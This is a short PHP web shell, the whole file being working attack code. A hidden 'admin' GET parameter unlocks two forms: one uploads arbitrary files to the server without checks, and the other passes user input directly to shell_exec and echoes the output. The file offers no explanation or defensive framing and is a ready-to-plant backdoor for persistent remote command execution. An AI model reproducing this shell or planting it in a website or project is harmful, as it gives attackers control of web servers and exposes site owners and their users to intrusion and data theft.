<?php
if(isset($_GET['admin']))
{

$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];
echo "<br><form method='POST' enctype='multipart/form-data'>
<input type='file' name='file' />
<input type='submit' value='>>>' />
</form>";
echo '<form method="post">
<input type="text" name="cmd" size="30">
<input type="submit" value="Kill">
</form>';
if(move_uploaded_file($filetmp,$filename)=='1'){
echo '[OK] ===> '.$filename;
}
if(isset($_POST['cmd'])){
if(function_exists('shell_exec')){
$cmd=$_POST['cmd'];
$oke = shell_exec("$cmd");
echo "<textarea  cols=30 rows=15;>$oke";}
}
}
?>